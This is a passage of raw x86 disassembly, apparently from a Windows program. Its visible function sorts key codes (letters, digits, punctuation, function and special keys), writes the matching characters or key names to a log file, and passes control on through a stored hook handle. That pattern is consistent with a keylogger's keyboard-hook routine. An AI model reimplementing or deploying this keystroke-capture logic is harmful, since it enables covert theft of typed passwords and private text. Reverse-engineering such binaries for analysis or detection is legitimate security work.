  401857:	c6 05 2c bc 40 00 29 	movb   $0x29,0x40bc2c
  40185e:	0f be 0d 2c bc 40 00 	movsbl 0x40bc2c,%ecx
  401865:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  40186b:	51                   	push   %ecx
  40186c:	68 f8 91 40 00       	push   $0x4091f8
  401871:	52                   	push   %edx
  401872:	e9 81 04 00 00       	jmp    0x401cf8
  401877:	83 f8 41             	cmp    $0x41,%eax
  40187a:	7c 2f                	jl     0x4018ab
  40187c:	83 f8 5a             	cmp    $0x5a,%eax
  40187f:	7f 2a                	jg     0x4018ab
  401881:	84 c9                	test   %cl,%cl
  401883:	75 06                	jne    0x40188b
  401885:	84 db                	test   %bl,%bl
  401887:	75 08                	jne    0x401891
  401889:	eb 04                	jmp    0x40188f
  40188b:	84 db                	test   %bl,%bl
  40188d:	74 02                	je     0x401891
  40188f:	04 20                	add    $0x20,%al
  401891:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401897:	a2 2c bc 40 00       	mov    %al,0x40bc2c
  40189c:	0f be c0             	movsbl %al,%eax
  40189f:	50                   	push   %eax
  4018a0:	68 f8 91 40 00       	push   $0x4091f8
  4018a5:	51                   	push   %ecx
  4018a6:	e9 4d 04 00 00       	jmp    0x401cf8
  4018ab:	83 f8 60             	cmp    $0x60,%eax
  4018ae:	7c 22                	jl     0x4018d2
  4018b0:	83 f8 69             	cmp    $0x69,%eax
  4018b3:	7f 1d                	jg     0x4018d2
  4018b5:	84 d2                	test   %dl,%dl
  4018b7:	0f 84 43 04 00 00    	je     0x401d00
  4018bd:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  4018c3:	83 c0 d0             	add    $0xffffffd0,%eax
  4018c6:	50                   	push   %eax
  4018c7:	68 f8 91 40 00       	push   $0x4091f8
  4018cc:	52                   	push   %edx
  4018cd:	e9 26 04 00 00       	jmp    0x401cf8
  4018d2:	3d ba 00 00 00       	cmp    $0xba,%eax
  4018d7:	0f 8c 7c 01 00 00    	jl     0x401a59
  4018dd:	3d de 00 00 00       	cmp    $0xde,%eax
  4018e2:	0f 8f 71 01 00 00    	jg     0x401a59
  4018e8:	05 46 ff ff ff       	add    $0xffffff46,%eax
  4018ed:	83 f8 24             	cmp    $0x24,%eax
  4018f0:	0f 87 57 01 00 00    	ja     0x401a4d
  4018f6:	33 c9                	xor    %ecx,%ecx
  4018f8:	8a 88 9c 1d 40 00    	mov    0x401d9c(%eax),%cl
  4018fe:	ff 24 8d 6c 1d 40 00 	jmp    *0x401d6c(,%ecx,4)
  401905:	84 db                	test   %bl,%bl
  401907:	0f 94 c3             	sete   %bl
  40190a:	83 c3 3a             	add    $0x3a,%ebx
  40190d:	0f be d3             	movsbl %bl,%edx
  401910:	52                   	push   %edx
  401911:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401917:	68 f8 91 40 00       	push   $0x4091f8
  40191c:	e9 d1 03 00 00       	jmp    0x401cf2
  401921:	f6 db                	neg    %bl
  401923:	1a db                	sbb    %bl,%bl
  401925:	80 e3 ee             	and    $0xee,%bl
  401928:	80 c3 3d             	add    $0x3d,%bl
  40192b:	0f be d3             	movsbl %bl,%edx
  40192e:	52                   	push   %edx
  40192f:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401935:	68 f8 91 40 00       	push   $0x4091f8
  40193a:	e9 b3 03 00 00       	jmp    0x401cf2
  40193f:	f6 db                	neg    %bl
  401941:	1a db                	sbb    %bl,%bl
  401943:	80 e3 10             	and    $0x10,%bl
  401946:	80 c3 2c             	add    $0x2c,%bl
  401949:	0f be d3             	movsbl %bl,%edx
  40194c:	52                   	push   %edx
  40194d:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401953:	68 f8 91 40 00       	push   $0x4091f8
  401958:	e9 95 03 00 00       	jmp    0x401cf2
  40195d:	f6 db                	neg    %bl
  40195f:	1a db                	sbb    %bl,%bl
  401961:	80 e3 32             	and    $0x32,%bl
  401964:	80 c3 2d             	add    $0x2d,%bl
  401967:	0f be d3             	movsbl %bl,%edx
  40196a:	52                   	push   %edx
  40196b:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401971:	68 f8 91 40 00       	push   $0x4091f8
  401976:	e9 77 03 00 00       	jmp    0x401cf2
  40197b:	f6 db                	neg    %bl
  40197d:	1a db                	sbb    %bl,%bl
  40197f:	80 e3 10             	and    $0x10,%bl
  401982:	80 c3 2e             	add    $0x2e,%bl
  401985:	0f be d3             	movsbl %bl,%edx
  401988:	52                   	push   %edx
  401989:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  40198f:	68 f8 91 40 00       	push   $0x4091f8
  401994:	e9 59 03 00 00       	jmp    0x401cf2
  401999:	f6 db                	neg    %bl
  40199b:	1a db                	sbb    %bl,%bl
  40199d:	80 e3 10             	and    $0x10,%bl
  4019a0:	80 c3 2f             	add    $0x2f,%bl
  4019a3:	0f be d3             	movsbl %bl,%edx
  4019a6:	52                   	push   %edx
  4019a7:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  4019ad:	68 f8 91 40 00       	push   $0x4091f8
  4019b2:	e9 3b 03 00 00       	jmp    0x401cf2
  4019b7:	f6 db                	neg    %bl
  4019b9:	1a db                	sbb    %bl,%bl
  4019bb:	80 e3 1e             	and    $0x1e,%bl
  4019be:	80 c3 60             	add    $0x60,%bl
  4019c1:	0f be d3             	movsbl %bl,%edx
  4019c4:	52                   	push   %edx
  4019c5:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  4019cb:	68 f8 91 40 00       	push   $0x4091f8
  4019d0:	e9 1d 03 00 00       	jmp    0x401cf2
  4019d5:	f6 db                	neg    %bl
  4019d7:	1a db                	sbb    %bl,%bl
  4019d9:	80 e3 20             	and    $0x20,%bl
  4019dc:	80 c3 5b             	add    $0x5b,%bl
  4019df:	0f be d3             	movsbl %bl,%edx
  4019e2:	52                   	push   %edx
  4019e3:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  4019e9:	68 f8 91 40 00       	push   $0x4091f8
  4019ee:	e9 ff 02 00 00       	jmp    0x401cf2
  4019f3:	f6 db                	neg    %bl
  4019f5:	1a db                	sbb    %bl,%bl
  4019f7:	80 e3 20             	and    $0x20,%bl
  4019fa:	80 c3 5c             	add    $0x5c,%bl
  4019fd:	0f be d3             	movsbl %bl,%edx
  401a00:	52                   	push   %edx
  401a01:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401a07:	68 f8 91 40 00       	push   $0x4091f8
  401a0c:	e9 e1 02 00 00       	jmp    0x401cf2
  401a11:	f6 db                	neg    %bl
  401a13:	1a db                	sbb    %bl,%bl
  401a15:	80 e3 20             	and    $0x20,%bl
  401a18:	80 c3 5d             	add    $0x5d,%bl
  401a1b:	0f be d3             	movsbl %bl,%edx
  401a1e:	52                   	push   %edx
  401a1f:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401a25:	68 f8 91 40 00       	push   $0x4091f8
  401a2a:	e9 c3 02 00 00       	jmp    0x401cf2
  401a2f:	f6 db                	neg    %bl
  401a31:	1a db                	sbb    %bl,%bl
  401a33:	80 e3 fb             	and    $0xfb,%bl
  401a36:	80 c3 27             	add    $0x27,%bl
  401a39:	0f be d3             	movsbl %bl,%edx
  401a3c:	52                   	push   %edx
  401a3d:	88 1d 2c bc 40 00    	mov    %bl,0x40bc2c
  401a43:	68 f8 91 40 00       	push   $0x4091f8
  401a48:	e9 a5 02 00 00       	jmp    0x401cf2
  401a4d:	c6 05 2c bc 40 00 6e 	movb   $0x6e,0x40bc2c
  401a54:	e9 a7 02 00 00       	jmp    0x401d00
  401a59:	83 f8 70             	cmp    $0x70,%eax
  401a5c:	0f 8c f4 00 00 00    	jl     0x401b56
  401a62:	83 f8 7b             	cmp    $0x7b,%eax
  401a65:	0f 8f eb 00 00 00    	jg     0x401b56
  401a6b:	83 c0 90             	add    $0xffffff90,%eax
  401a6e:	83 f8 0b             	cmp    $0xb,%eax
  401a71:	0f 87 89 02 00 00    	ja     0x401d00
  401a77:	ff 24 85 c4 1d 40 00 	jmp    *0x401dc4(,%eax,4)
  401a7e:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401a84:	68 f0 91 40 00       	push   $0x4091f0
  401a89:	68 04 92 40 00       	push   $0x409204
  401a8e:	51                   	push   %ecx
  401a8f:	e9 64 02 00 00       	jmp    0x401cf8
  401a94:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  401a9a:	68 e8 91 40 00       	push   $0x4091e8
  401a9f:	68 04 92 40 00       	push   $0x409204
  401aa4:	52                   	push   %edx
  401aa5:	e9 4e 02 00 00       	jmp    0x401cf8
  401aaa:	68 e0 91 40 00       	push   $0x4091e0
  401aaf:	e9 39 02 00 00       	jmp    0x401ced
  401ab4:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401aba:	68 d8 91 40 00       	push   $0x4091d8
  401abf:	68 04 92 40 00       	push   $0x409204
  401ac4:	51                   	push   %ecx
  401ac5:	e9 2e 02 00 00       	jmp    0x401cf8
  401aca:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  401ad0:	68 d0 91 40 00       	push   $0x4091d0
  401ad5:	68 04 92 40 00       	push   $0x409204
  401ada:	52                   	push   %edx
  401adb:	e9 18 02 00 00       	jmp    0x401cf8
  401ae0:	68 c8 91 40 00       	push   $0x4091c8
  401ae5:	e9 03 02 00 00       	jmp    0x401ced
  401aea:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401af0:	68 c0 91 40 00       	push   $0x4091c0
  401af5:	68 04 92 40 00       	push   $0x409204
  401afa:	51                   	push   %ecx
  401afb:	e9 f8 01 00 00       	jmp    0x401cf8
  401b00:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  401b06:	68 b8 91 40 00       	push   $0x4091b8
  401b0b:	68 04 92 40 00       	push   $0x409204
  401b10:	52                   	push   %edx
  401b11:	e9 e2 01 00 00       	jmp    0x401cf8
  401b16:	68 b0 91 40 00       	push   $0x4091b0
  401b1b:	e9 cd 01 00 00       	jmp    0x401ced
  401b20:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401b26:	68 a8 91 40 00       	push   $0x4091a8
  401b2b:	68 04 92 40 00       	push   $0x409204
  401b30:	51                   	push   %ecx
  401b31:	e9 c2 01 00 00       	jmp    0x401cf8
  401b36:	8b 15 28 bc 40 00    	mov    0x40bc28,%edx
  401b3c:	68 a0 91 40 00       	push   $0x4091a0
  401b41:	68 04 92 40 00       	push   $0x409204
  401b46:	52                   	push   %edx
  401b47:	e9 ac 01 00 00       	jmp    0x401cf8
  401b4c:	68 98 91 40 00       	push   $0x409198
  401b51:	e9 97 01 00 00       	jmp    0x401ced
  401b56:	83 f8 08             	cmp    $0x8,%eax
  401b59:	0f 8c a1 01 00 00    	jl     0x401d00
  401b5f:	83 f8 2e             	cmp    $0x2e,%eax
  401b62:	0f 8f 98 01 00 00    	jg     0x401d00
  401b68:	83 c0 f8             	add    $0xfffffff8,%eax
  401b6b:	83 f8 26             	cmp    $0x26,%eax
  401b6e:	0f 87 d9 fe ff ff    	ja     0x401a4d
  401b74:	33 c9                	xor    %ecx,%ecx
  401b76:	8a 88 34 1e 40 00    	mov    0x401e34(%eax),%cl
  401b7c:	ff 24 8d f4 1d 40 00 	jmp    *0x401df4(,%ecx,4)
  401b83:	bf 90 91 40 00       	mov    $0x409190,%edi
  401b88:	e9 32 01 00 00       	jmp    0x401cbf
  401b8d:	bf 08 92 40 00       	mov    $0x409208,%edi
  401b92:	83 c9 ff             	or     $0xffffffff,%ecx
  401b95:	33 c0                	xor    %eax,%eax
  401b97:	f2 ae                	repnz scas %es:(%edi),%al
  401b99:	f7 d1                	not    %ecx
  401b9b:	2b f9                	sub    %ecx,%edi
  401b9d:	8b c1                	mov    %ecx,%eax
  401b9f:	8b f7                	mov    %edi,%esi
  401ba1:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401ba6:	c1 e9 02             	shr    $0x2,%ecx
  401ba9:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401bab:	8b c8                	mov    %eax,%ecx
  401bad:	e9 28 01 00 00       	jmp    0x401cda
  401bb2:	bf 88 91 40 00       	mov    $0x409188,%edi
  401bb7:	e9 03 01 00 00       	jmp    0x401cbf
  401bbc:	bf 80 91 40 00       	mov    $0x409180,%edi
  401bc1:	83 c9 ff             	or     $0xffffffff,%ecx
  401bc4:	33 c0                	xor    %eax,%eax
  401bc6:	f2 ae                	repnz scas %es:(%edi),%al
  401bc8:	f7 d1                	not    %ecx
  401bca:	2b f9                	sub    %ecx,%edi
  401bcc:	8b c1                	mov    %ecx,%eax
  401bce:	8b f7                	mov    %edi,%esi
  401bd0:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401bd5:	c1 e9 02             	shr    $0x2,%ecx
  401bd8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401bda:	8b c8                	mov    %eax,%ecx
  401bdc:	e9 f9 00 00 00       	jmp    0x401cda
  401be1:	bf 78 91 40 00       	mov    $0x409178,%edi
  401be6:	e9 d4 00 00 00       	jmp    0x401cbf
  401beb:	bf 70 91 40 00       	mov    $0x409170,%edi
  401bf0:	83 c9 ff             	or     $0xffffffff,%ecx
  401bf3:	33 c0                	xor    %eax,%eax
  401bf5:	f2 ae                	repnz scas %es:(%edi),%al
  401bf7:	f7 d1                	not    %ecx
  401bf9:	2b f9                	sub    %ecx,%edi
  401bfb:	8b c1                	mov    %ecx,%eax
  401bfd:	8b f7                	mov    %edi,%esi
  401bff:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401c04:	c1 e9 02             	shr    $0x2,%ecx
  401c07:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c09:	8b c8                	mov    %eax,%ecx
  401c0b:	e9 ca 00 00 00       	jmp    0x401cda
  401c10:	bf 68 91 40 00       	mov    $0x409168,%edi
  401c15:	e9 a5 00 00 00       	jmp    0x401cbf
  401c1a:	bf 60 91 40 00       	mov    $0x409160,%edi
  401c1f:	83 c9 ff             	or     $0xffffffff,%ecx
  401c22:	33 c0                	xor    %eax,%eax
  401c24:	f2 ae                	repnz scas %es:(%edi),%al
  401c26:	f7 d1                	not    %ecx
  401c28:	2b f9                	sub    %ecx,%edi
  401c2a:	8b c1                	mov    %ecx,%eax
  401c2c:	8b f7                	mov    %edi,%esi
  401c2e:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401c33:	c1 e9 02             	shr    $0x2,%ecx
  401c36:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c38:	8b c8                	mov    %eax,%ecx
  401c3a:	e9 9b 00 00 00       	jmp    0x401cda
  401c3f:	bf 58 91 40 00       	mov    $0x409158,%edi
  401c44:	eb 79                	jmp    0x401cbf
  401c46:	bf 50 91 40 00       	mov    $0x409150,%edi
  401c4b:	83 c9 ff             	or     $0xffffffff,%ecx
  401c4e:	33 c0                	xor    %eax,%eax
  401c50:	f2 ae                	repnz scas %es:(%edi),%al
  401c52:	f7 d1                	not    %ecx
  401c54:	2b f9                	sub    %ecx,%edi
  401c56:	8b c1                	mov    %ecx,%eax
  401c58:	8b f7                	mov    %edi,%esi
  401c5a:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401c5f:	c1 e9 02             	shr    $0x2,%ecx
  401c62:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c64:	8b c8                	mov    %eax,%ecx
  401c66:	eb 72                	jmp    0x401cda
  401c68:	bf 48 91 40 00       	mov    $0x409148,%edi
  401c6d:	eb 50                	jmp    0x401cbf
  401c6f:	bf 40 91 40 00       	mov    $0x409140,%edi
  401c74:	83 c9 ff             	or     $0xffffffff,%ecx
  401c77:	33 c0                	xor    %eax,%eax
  401c79:	f2 ae                	repnz scas %es:(%edi),%al
  401c7b:	f7 d1                	not    %ecx
  401c7d:	2b f9                	sub    %ecx,%edi
  401c7f:	8b c1                	mov    %ecx,%eax
  401c81:	8b f7                	mov    %edi,%esi
  401c83:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401c88:	c1 e9 02             	shr    $0x2,%ecx
  401c8b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401c8d:	8b c8                	mov    %eax,%ecx
  401c8f:	eb 49                	jmp    0x401cda
  401c91:	bf 38 91 40 00       	mov    $0x409138,%edi
  401c96:	eb 27                	jmp    0x401cbf
  401c98:	bf 30 91 40 00       	mov    $0x409130,%edi
  401c9d:	83 c9 ff             	or     $0xffffffff,%ecx
  401ca0:	33 c0                	xor    %eax,%eax
  401ca2:	f2 ae                	repnz scas %es:(%edi),%al
  401ca4:	f7 d1                	not    %ecx
  401ca6:	2b f9                	sub    %ecx,%edi
  401ca8:	8b c1                	mov    %ecx,%eax
  401caa:	8b f7                	mov    %edi,%esi
  401cac:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401cb1:	c1 e9 02             	shr    $0x2,%ecx
  401cb4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401cb6:	8b c8                	mov    %eax,%ecx
  401cb8:	eb 20                	jmp    0x401cda
  401cba:	bf 28 91 40 00       	mov    $0x409128,%edi
  401cbf:	83 c9 ff             	or     $0xffffffff,%ecx
  401cc2:	33 c0                	xor    %eax,%eax
  401cc4:	f2 ae                	repnz scas %es:(%edi),%al
  401cc6:	f7 d1                	not    %ecx
  401cc8:	2b f9                	sub    %ecx,%edi
  401cca:	8b d1                	mov    %ecx,%edx
  401ccc:	8b f7                	mov    %edi,%esi
  401cce:	bf 30 bc 40 00       	mov    $0x40bc30,%edi
  401cd3:	c1 e9 02             	shr    $0x2,%ecx
  401cd6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401cd8:	8b ca                	mov    %edx,%ecx
  401cda:	a0 2c bc 40 00       	mov    0x40bc2c,%al
  401cdf:	83 e1 03             	and    $0x3,%ecx
  401ce2:	3c 6e                	cmp    $0x6e,%al
  401ce4:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401ce6:	74 18                	je     0x401d00
  401ce8:	68 30 bc 40 00       	push   $0x40bc30
  401ced:	68 04 92 40 00       	push   $0x409204
  401cf2:	a1 28 bc 40 00       	mov    0x40bc28,%eax
  401cf7:	50                   	push   %eax
  401cf8:	e8 b0 03 00 00       	call   0x4020ad
  401cfd:	83 c4 0c             	add    $0xc,%esp
  401d00:	8b 0d 28 bc 40 00    	mov    0x40bc28,%ecx
  401d06:	51                   	push   %ecx
  401d07:	e8 25 04 00 00       	call   0x402131
  401d0c:	83 c4 04             	add    $0x4,%esp
  401d0f:	5e                   	pop    %esi
  401d10:	5d                   	pop    %ebp
  401d11:	5b                   	pop    %ebx
  401d12:	8b 94 24 28 01 00 00 	mov    0x128(%esp),%edx
  401d19:	8b 84 24 24 01 00 00 	mov    0x124(%esp),%eax
  401d20:	8b 8c 24 20 01 00 00 	mov    0x120(%esp),%ecx
  401d27:	52                   	push   %edx
  401d28:	8b 15 14 bc 40 00    	mov    0x40bc14,%edx
  401d2e:	50                   	push   %eax
  401d2f:	51                   	push   %ecx
  401d30:	52                   	push   %edx
  401d31:	ff 15 e0 80 40 00    	call   *0x4080e0
  401d37:	5f                   	pop    %edi
  401d38:	81 c4 18 01 00 00    	add    $0x118,%esp
  401d3e:	c2 0c 00             	ret    $0xc
  401d41:	8d 49 00             	lea    0x0(%ecx),%ecx
  401d44:	57                   	push   %edi
  401d45:	18 40 00             	sbb    %al,0x0(%eax)
  401d48:	06                   	push   %es
  401d49:	18 40 00             	sbb    %al,0x0(%eax)
  401d4c:	0f 18 40 00          	prefetchnta 0x0(%eax)
  401d50:	18 18                	sbb    %bl,(%eax)
  401d52:	40                   	inc    %eax
  401d53:	00 21                	add    %ah,(%ecx)
  401d55:	18 40 00             	sbb    %al,0x0(%eax)
  401d58:	2a 18                	sub    (%eax),%bl
  401d5a:	40                   	inc    %eax
  401d5b:	00 33                	add    %dh,(%ebx)
  401d5d:	18 40 00             	sbb    %al,0x0(%eax)
  401d60:	3c 18                	cmp    $0x18,%al
  401d62:	40                   	inc    %eax
  401d63:	00 45 18             	add    %al,0x18(%ebp)
  401d66:	40                   	inc    %eax
  401d67:	00 4e 18             	add    %cl,0x18(%esi)
  401d6a:	40                   	inc    %eax
  401d6b:	00 05 19 40 00 21    	add    %al,0x21004019
  401d71:	19 40 00             	sbb    %eax,0x0(%eax)
  401d74:	3f                   	aas
  401d75:	19 40 00             	sbb    %eax,0x0(%eax)
  401d78:	5d                   	pop    %ebp
  401d79:	19 40 00             	sbb    %eax,0x0(%eax)
  401d7c:	7b 19                	jnp    0x401d97
  401d7e:	40                   	inc    %eax
  401d7f:	00 99 19 40 00 b7    	add    %bl,-0x48ffbfe7(%ecx)
  401d85:	19 40 00             	sbb    %eax,0x0(%eax)
  401d88:	d5 19                	aad    $0x19
  401d8a:	40                   	inc    %eax
  401d8b:	00 f3                	add    %dh,%bl
  401d8d:	19 40 00             	sbb    %eax,0x0(%eax)
  401d90:	11 1a                	adc    %ebx,(%edx)
  401d92:	40                   	inc    %eax
  401d93:	00 2f                	add    %ch,(%edi)
  401d95:	1a 40 00             	sbb    0x0(%eax),%al
  401d98:	4d                   	dec    %ebp
  401d99:	1a 40 00             	sbb    0x0(%eax),%al
  401d9c:	00 01                	add    %al,(%ecx)
  401d9e:	02 03                	add    (%ebx),%al
  401da0:	04 05                	add    $0x5,%al
  401da2:	06                   	push   %es
  401da3:	0b 0b                	or     (%ebx),%ecx
  401da5:	0b 0b                	or     (%ebx),%ecx
  401da7:	0b 0b                	or     (%ebx),%ecx
  401da9:	0b 0b                	or     (%ebx),%ecx
  401dab:	0b 0b                	or     (%ebx),%ecx
  401dad:	0b 0b                	or     (%ebx),%ecx
  401daf:	0b 0b                	or     (%ebx),%ecx
  401db1:	0b 0b                	or     (%ebx),%ecx
  401db3:	0b 0b                	or     (%ebx),%ecx
  401db5:	0b 0b                	or     (%ebx),%ecx
  401db7:	0b 0b                	or     (%ebx),%ecx
  401db9:	0b 0b                	or     (%ebx),%ecx
  401dbb:	0b 0b                	or     (%ebx),%ecx
  401dbd:	07                   	pop    %es
  401dbe:	08 09                	or     %cl,(%ecx)
  401dc0:	0a 8d 49 00 7e 1a    	or     0x1a7e0049(%ebp),%cl
  401dc6:	40                   	inc    %eax
  401dc7:	00 94 1a 40 00 aa 1a 	add    %dl,0x1aaa0040(%edx,%ebx,1)
  401dce:	40                   	inc    %eax
  401dcf:	00 b4 1a 40 00 ca 1a 	add    %dh,0x1aca0040(%edx,%ebx,1)
  401dd6:	40                   	inc    %eax
  401dd7:	00 e0                	add    %ah,%al
  401dd9:	1a 40 00             	sbb    0x0(%eax),%al
  401ddc:	ea 1a 40 00 00 1b 40 	ljmp   $0x401b,$0x401a
  401de3:	00 16                	add    %dl,(%esi)
  401de5:	1b 40 00             	sbb    0x0(%eax),%eax
  401de8:	20 1b                	and    %bl,(%ebx)
  401dea:	40                   	inc    %eax
  401deb:	00 36                	add    %dh,(%esi)
  401ded:	1b 40 00             	sbb    0x0(%eax),%eax
  401df0:	4c                   	dec    %esp
  401df1:	1b 40 00             	sbb    0x0(%eax),%eax
  401df4:	83 1b 40             	sbbl   $0x40,(%ebx)
  401df7:	00 8d 1b 40 00 b2    	add    %cl,-0x4dffbfe5(%ebp)
  401dfd:	1b 40 00             	sbb    0x0(%eax),%eax
  401e00:	bc 1b 40 00 e1       	mov    $0xe100401b,%esp
  401e05:	1b 40 00             	sbb    0x0(%eax),%eax
  401e08:	eb 1b                	jmp    0x401e25
  401e0a:	40                   	inc    %eax
  401e0b:	00 10                	add    %dl,(%eax)
  401e0d:	1c 40                	sbb    $0x40,%al
  401e0f:	00 1a                	add    %bl,(%edx)
  401e11:	1c 40                	sbb    $0x40,%al
  401e13:	00 3f                	add    %bh,(%edi)
  401e15:	1c 40                	sbb    $0x40,%al
  401e17:	00 46 1c             	add    %al,0x1c(%esi)
  401e1a:	40                   	inc    %eax
  401e1b:	00 68 1c             	add    %ch,0x1c(%eax)
  401e1e:	40                   	inc    %eax
  401e1f:	00 6f 1c             	add    %ch,0x1c(%edi)
  401e22:	40                   	inc    %eax
  401e23:	00 91 1c 40 00 98    	add    %dl,-0x67ffbfe4(%ecx)
  401e29:	1c 40                	sbb    $0x40,%al
  401e2b:	00 ba 1c 40 00 4d    	add    %bh,0x4d00401c(%edx)
  401e31:	1a 40 00             	sbb    0x0(%eax),%al
  401e34:	00 01                	add    %al,(%ecx)
  401e36:	0f                   	(bad)
  401e37:	0f                   	(bad)
  401e38:	0f 02 0f             	lar    (%edi),%ecx
  401e3b:	0f                   	(bad)
  401e3c:	0f                   	(bad)
  401e3d:	0f                   	(bad)
  401e3e:	0f                   	(bad)
  401e3f:	0f                   	(bad)
  401e40:	0f                   	(bad)
  401e41:	0f                   	(bad)
  401e42:	0f                   	(bad)
  401e43:	0f                   	(bad)
  401e44:	0f                   	(bad)
  401e45:	0f                   	(bad)
  401e46:	0f 03 0f             	lsl    (%edi),%ecx
  401e49:	0f                   	(bad)
  401e4a:	0f                   	(bad)
  401e4b:	0f 04                	(bad)
  401e4d:	05 06 07 08 09       	add    $0x9080706,%eax
  401e52:	0a 0b                	or     (%ebx),%cl
  401e54:	0c 0f                	or     $0xf,%al
  401e56:	0f 0f 0f 0d          	pi2fd  (%edi),%mm1
  401e5a:	0e                   	push   %cs
  401e5b:	90                   	nop
  401e5c:	90                   	nop
  401e5d:	90                   	nop
  401e5e:	90                   	nop
  401e5f:	90                   	nop
  401e60:	55                   	push   %ebp
  401e61:	8b ec                	mov    %esp,%ebp
  401e63:	57                   	push   %edi
  401e64:	56                   	push   %esi
  401e65:	53                   	push   %ebx
  401e66:	8b 4d 10             	mov    0x10(%ebp),%ecx
  401e69:	e3 26                	jecxz  0x401e91
  401e6b:	8b d9                	mov    %ecx,%ebx
  401e6d:	8b 7d 08             	mov    0x8(%ebp),%edi
  401e70:	8b f7                	mov    %edi,%esi
  401e72:	33 c0                	xor    %eax,%eax
  401e74:	f2 ae                	repnz scas %es:(%edi),%al
  401e76:	f7 d9                	neg    %ecx
  401e78:	03 cb                	add    %ebx,%ecx
  401e7a:	8b fe                	mov    %esi,%edi
  401e7c:	8b 75 0c             	mov    0xc(%ebp),%esi
  401e7f:	f3 a6                	repz cmpsb %es:(%edi),%ds:(%esi)
  401e81:	8a 46 ff             	mov    -0x1(%esi),%al
  401e84:	33 c9                	xor    %ecx,%ecx
  401e86:	3a 47 ff             	cmp    -0x1(%edi),%al
  401e89:	77 04                	ja     0x401e8f
  401e8b:	74 04                	je     0x401e91
  401e8d:	49                   	dec    %ecx
  401e8e:	49                   	dec    %ecx
  401e8f:	f7 d1                	not    %ecx
  401e91:	8b c1                	mov    %ecx,%eax
  401e93:	5b                   	pop    %ebx
  401e94:	5e                   	pop    %esi
  401e95:	5f                   	pop    %edi
  401e96:	c9                   	leave
  401e97:	c3                   	ret
  401e98:	53                   	push   %ebx
  401e99:	56                   	push   %esi
  401e9a:	be a0 92 40 00       	mov    $0x4092a0,%esi
  401e9f:	57                   	push   %edi
  401ea0:	56                   	push   %esi
  401ea1:	e8 53 04 00 00       	call   0x4022f9
  401ea6:	8b f8                	mov    %eax,%edi
  401ea8:	8d 44 24 18          	lea    0x18(%esp),%eax
  401eac:	50                   	push   %eax
  401ead:	ff 74 24 18          	push   0x18(%esp)
  401eb1:	56                   	push   %esi
  401eb2:	e8 0c 05 00 00       	call   0x4023c3
  401eb7:	56                   	push   %esi
  401eb8:	57                   	push   %edi
  401eb9:	8b d8                	mov    %eax,%ebx
  401ebb:	e8 c6 04 00 00       	call   0x402386
  401ec0:	83 c4 18             	add    $0x18,%esp
  401ec3:	8b c3                	mov    %ebx,%eax
  401ec5:	5f                   	pop    %edi
  401ec6:	5e                   	pop    %esi
  401ec7:	5b                   	pop    %ebx
  401ec8:	c3                   	ret
  401ec9:	56                   	push   %esi
  401eca:	8b 74 24 08          	mov    0x8(%esp),%esi
  401ece:	57                   	push   %edi
  401ecf:	8b 46 0c             	mov    0xc(%esi),%eax
  401ed2:	a8 83                	test   $0x83,%al
  401ed4:	74 6f                	je     0x401f45
  401ed6:	8b 7c 24 14          	mov    0x14(%esp),%edi
  401eda:	85 ff                	test   %edi,%edi
  401edc:	74 0a                	je     0x401ee8
  401ede:	83 ff 01             	cmp    $0x1,%edi
  401ee1:	74 05                	je     0x401ee8
  401ee3:	83 ff 02             	cmp    $0x2,%edi
  401ee6:	75 5d                	jne    0x401f45
  401ee8:	24 ef                	and    $0xef,%al
  401eea:	83 ff 01             	cmp    $0x1,%edi
  401eed:	89 46 0c             	mov    %eax,0xc(%esi)
  401ef0:	75 0d                	jne    0x401eff
  401ef2:	56                   	push   %esi
  401ef3:	e8 5d 00 00 00       	call   0x401f55
  401ef8:	01 44 24 14          	add    %eax,0x14(%esp)
  401efc:	59                   	pop    %ecx
  401efd:	33 ff                	xor    %edi,%edi
  401eff:	56                   	push   %esi
  401f00:	e8 b5 0f 00 00       	call   0x402eba
  401f05:	8b 46 0c             	mov    0xc(%esi),%eax
  401f08:	59                   	pop    %ecx
  401f09:	a8 80                	test   $0x80,%al
  401f0b:	74 07                	je     0x401f14
  401f0d:	24 fc                	and    $0xfc,%al
  401f0f:	89 46 0c             	mov    %eax,0xc(%esi)
  401f12:	eb 14                	jmp    0x401f28
  401f14:	a8 01                	test   $0x1,%al
  401f16:	74 10                	je     0x401f28
  401f18:	a8 08                	test   $0x8,%al
  401f1a:	74 0c                	je     0x401f28
  401f1c:	f6 c4 04             	test   $0x4,%ah
  401f1f:	75 07                	jne    0x401f28
